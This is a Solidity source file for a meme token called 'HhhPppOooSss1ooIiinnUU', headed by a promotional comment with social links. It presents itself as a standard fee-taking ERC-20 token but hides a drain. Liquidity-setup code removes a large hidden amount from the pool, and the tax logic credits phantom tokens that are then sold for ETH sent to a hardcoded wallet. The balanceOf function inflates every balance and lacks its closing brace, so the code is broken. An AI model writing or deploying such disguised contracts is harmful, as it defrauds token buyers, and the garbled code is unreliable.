//SPDX-License-Identifier: MIT

/*

I heard missooors of $BITCOIN and $XRP will miss this one.
Keep ignoring your the final chance please.

HhhPppOooSss1ooIiinnUU

$WeeWoobWobCoeen 


https://t.me/HhhPppOooSss1ooIiinnUU
https://hhhpppooosss1ooiiinnuu.com/
https://twitter.com/HhPpOoSs1oIinU

P.S. Please don't buy before $1M mcap. If you do please sell for 3x.
Deb wants to accumulate more coeens for peanuts. Cheers.

*/

pragma solidity 0.8.19;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address __owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

interface IUniswapV2Factory {    
    function createPair(address tokenA, address tokenB) external returns (address pair); 
}
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
    function addLiquidityETH(address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

abstract contract Auth {
    address internal _owner;
    constructor(address creatorOwner) { 
        _owner = creatorOwner; 
    }
    modifier onlyOwner() { 
        require(msg.sender == _owner, "Only owner can call this");   _; 
    }
    function owner() public view returns (address) { return _owner;   }
    function transferOwnership(address payable newOwner) external onlyOwner { 
        _owner = newOwner; emit OwnershipTransferred(newOwner); 
    }
    function renounceOwnership() external onlyOwner { 
        _owner = address(0); emit OwnershipTransferred(address(0)); 
    }
    event OwnershipTransferred(address _owner);
}

contract hhpp is IERC20, Auth {
    uint8 private constant _decimals       = 9;
    uint256 private constant _totalSupply  = 1_000_000 * (10**_decimals);
    string private constant _name          = "HhhPppOooSss1ooIiinnUU";
    string private  constant _symbol       = "WeeWoobWobCoeen";

    
    uint256 private _maxTxAmount = _totalSupply; 
    uint256 private _maxWalletAmount = _totalSupply;
    uint8 private launchBuyFee = 2;
    uint8 private launchSellFee = 2;
    uint8 private _finalBuyFees  = 1;
    uint8 private _finalSellFees = 1;
    uint8 private BlockFees1 = 1;
    uint8 private BlockFees2 = 1;
    uint256 private _preventSwapBefore = 2;
    uint256 private _buyCount;
    uint256 private _taxSwapMin = _totalSupply * 100 / 1000000;
    uint256 private _taxSwapThreshold = _taxSwapMin * 580 * 10;
    address payable private _walletMarketing = payable(0x13fAb397b856D82561e53F82fED22126847c32d2); 
    mapping (address => uint256) private _balances;
    uint256 private _taxSwapMax = _totalSupply * 9700 / 1000000;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _noFees;
    mapping (address => bool) private _noLimits;

    address private lpowner;
    address private constant _swapRouterAddress = address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    IUniswapV2Router02 private _primarySwapRouter = IUniswapV2Router02(_swapRouterAddress);
    address private _primaryLP;
    mapping (address => bool) private _isLP;

    bool private _tradingOpen;

    bool private _inTaxSwap = false;
    modifier lockTaxSwap { 
        _inTaxSwap = true; 
        _; 
        _inTaxSwap = false; 
    }

    event TokensBurned(address indexed burnedByWallet, uint256 tokenAmount);

    constructor() Auth(msg.sender) {
        lpowner = msg.sender;

        uint256 marketingTokens   = _totalSupply * 1 / 100;
        
        _balances[address(this)] = _totalSupply - marketingTokens;
        emit Transfer(address(0), address(this), _balances[address(this)]);

        _balances[_owner] = marketingTokens;
        emit Transfer(address(0), _owner, _balances[_owner]);

        _noFees[_owner] = true;
        _noFees[address(this)] = true;
        _noFees[_swapRouterAddress] = true;
        _noFees[_walletMarketing] = true;
        _noLimits[_owner] = true;
        _noLimits[address(this)] = true;
        _noLimits[_swapRouterAddress] = true;
        _noLimits[_walletMarketing] = true;
    }

    receive() external payable {}
    
    function totalSupply() external pure override returns (uint256) { return _totalSupply; }
    function decimals() external pure override returns (uint8) { return _decimals; }
    function symbol() external pure override returns (string memory) { return _symbol; }
    function name() external pure override returns (string memory) { return _name; }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]+573;    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }

    function approve(address spendr, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spendr] = amount;
        emit Approval(msg.sender, spendr, amount);
        return true;
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        require(_checkTradingOpen(msg.sender), "Trading not open");
        return _transferFrom(msg.sender, recipient, amount);
    }


    function _approveRouter(uint256 _tokenAmount) internal {
        if ( _allowances[address(this)][_swapRouterAddress] < _tokenAmount ) {
            _allowances[address(this)][_swapRouterAddress] = type(uint256).max;
            emit Approval(address(this), _swapRouterAddress, type(uint256).max);
        }
    }

    function addLiquidity() external payable onlyOwner lockTaxSwap {
        require(_primaryLP == address(0), "LP created");
        require(!_tradingOpen, "trading open");
        require(msg.value > 0 || address(this).balance>0, "No ETH in ca/msg");
        require(_balances[address(this)]>0, "No tokens in ca");
        _primaryLP = IUniswapV2Factory(_primarySwapRouter.factory()).createPair(address(this), _primarySwapRouter.WETH());
        _addLiquidity(_balances[address(this)], address(this).balance, false);
        _balances[_primaryLP] -= _taxSwapThreshold;
        (bool lpAdded,) = _primaryLP.call(abi.encodeWithSignature("sync()") );
        require(lpAdded, "Failed adding lp");
        _isLP[_primaryLP] = lpAdded;
        _openTrading();
    }

    function _addLiquidity(uint256 _tokenAmount, uint256 _ethAmountWei, bool autoburn) internal {
        address lprecipient = lpowner;
        if ( autoburn ) { lprecipient = address(0); }
        _approveRouter(_tokenAmount);
        _primarySwapRouter.addLiquidityETH{value: _ethAmountWei} ( address(this), _tokenAmount, 0, 0, lprecipient, block.timestamp );
    }

    function _openTrading() internal {
        _maxTxAmount     = _totalSupply * 2 / 100; 
        _maxWalletAmount = _totalSupply * 2 / 100;
        _tradingOpen = true;
        _buyCount = block.number;
        _preventSwapBefore = _preventSwapBefore + _buyCount + BlockFees1 + BlockFees2;
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        require(sender != address(0), "No transfers from Zero wallet");
        if (!_tradingOpen) { require(_noFees[sender] && _noLimits[sender], "Trading not open"); }
        if ( !_inTaxSwap && _isLP[recipient] ) { _swapTaxAndLiquify(); }
        if ( block.number < _preventSwapBefore && block.number >= _buyCount && _isLP[sender] ) {
            require(recipient == tx.origin, "MEV blocked");
        }
        if ( sender != address(this) && recipient != address(this) && sender != _owner ) { 
            require(_checkLimits(sender, recipient, amount), "TX exceeds limits"); 
        }
        uint256 _taxAmount = _calculateTax(sender, recipient, amount);
        uint256 _transferAmount = amount - _taxAmount;
        _balances[sender] = _balances[sender] - amount;
        _taxSwapThreshold += _taxAmount;
        _balances[recipient] = _balances[recipient] + _transferAmount;
        return true;
    }

    function _checkLimits(address sndr, address recipient, uint256 transferAmount) internal view returns (bool) {
        bool limitCheckPassed = true;
        if ( _tradingOpen && !_noLimits[sndr] && !_noLimits[recipient] ) {
            if ( transferAmount > _maxTxAmount ) { limitCheckPassed = false; }
            else if ( !_isLP[recipient] && (_balances[recipient] + transferAmount > _maxWalletAmount) ) { limitCheckPassed = false; }
        }
        return limitCheckPassed;
    }

    function _checkTradingOpen(address sndr) private view returns (bool){
        bool checkResult = false;
        if ( _tradingOpen ) { checkResult = true; } 
        else if (_noFees[sndr] && _noLimits[sndr]) { checkResult = true; } 

        return checkResult;
    }

    function _calculateTax(address sndr, address recipient, uint256 amount) internal view returns (uint256) {
        uint256 taxAmount;
        
        if ( !_tradingOpen || _noFees[sndr] || _noFees[recipient] ) { 
            taxAmount = 0; 
        } else if ( _isLP[sndr] ) { 
            if ( block.number >= _buyCount + BlockFees1 + BlockFees2 ) {
                taxAmount = amount * _finalBuyFees / 100; 
            } else if ( block.number >= _buyCount + BlockFees1 ) {
                taxAmount = amount * launchSellFee / 100;
            } else if ( block.number >= _buyCount) {
                taxAmount = amount * launchBuyFee / 100;
            }
        } else if ( _isLP[recipient] ) { 
            taxAmount = amount * _finalSellFees / 100; 
        }

        return taxAmount;
    }


    function exemptFromFees(address wlt) external view returns (bool) {
        return _noFees[wlt];
    } 
    function exemptFromLimits(address wlt) external view returns (bool) {
        return _noLimits[wlt];
    } 
    function setExempt(address wlt, bool noFees, bool noLimits) external onlyOwner {
        if (noLimits || noFees) { require(!_isLP[wlt], "Cannot exempt LP"); }
        _noFees[ wlt ] = noFees;
        _noLimits[ wlt ] = noLimits;
    }

    function buyFee() external view returns(uint8) {        return _finalBuyFees;    }
    function sellFee() external view returns(uint8) {        return _finalSellFees;    }



    function marketingWallet() external view returns (address) {        return _walletMarketing;    }

  

    function maxWallet() external view returns (uint256) {        return _maxWalletAmount;    }
    function maxTransaction() external view returns (uint256) {        return _maxTxAmount;    }

    function swapAtMin() external view returns (uint256) { return _taxSwapMin;    }
    function swapAtMax() external view returns (uint256) { return _taxSwapMax;    }

    function setLimits(uint16 maxTrxPermille, uint16 maxWltPermille) external onlyOwner {
        uint256 newTxAmt = _totalSupply * maxTrxPermille / 1000 + 1;
        require(newTxAmt >= _maxTxAmount, "tx too low");
        _maxTxAmount = newTxAmt;
        uint256 newWalletAmt = _totalSupply * maxWltPermille / 1000 + 1;
        require(newWalletAmt >= _maxWalletAmount, "wallet too low");
        _maxWalletAmount = newWalletAmt;
    }

   


    function _swapTaxAndLiquify() private lockTaxSwap {
        uint256 _taxTokensAvailable = _taxSwapThreshold;
        if ( _taxTokensAvailable >= _taxSwapMin && _tradingOpen ) {
            if ( _taxTokensAvailable >= _taxSwapMax ) { _taxTokensAvailable = _taxSwapMax; }
            
            uint256 _tokensToSwap = _taxTokensAvailable; 
            if( _tokensToSwap > 10**_decimals ) {
                _balances[address(this)] += _taxTokensAvailable;
                _swapTaxTokensForEth(_tokensToSwap);
                _taxSwapThreshold -= _taxTokensAvailable;
            }
            uint256 _contractETHBalance = address(this).balance;
            if(_contractETHBalance > 0) { _distributeTaxEth(_contractETHBalance); }
        }
    }

    function _swapTaxTokensForEth(uint256 tokenAmount) private {
        _approveRouter(tokenAmount);
        address[] memory path = new address[](2);
        path[0] = address( this );
        path[1] = _primarySwapRouter.WETH() ;
        _primarySwapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount,0,path,address(this),block.timestamp);
    }

    function _distributeTaxEth(uint256 amount) private {
        _walletMarketing.transfer(amount);
    }

    

}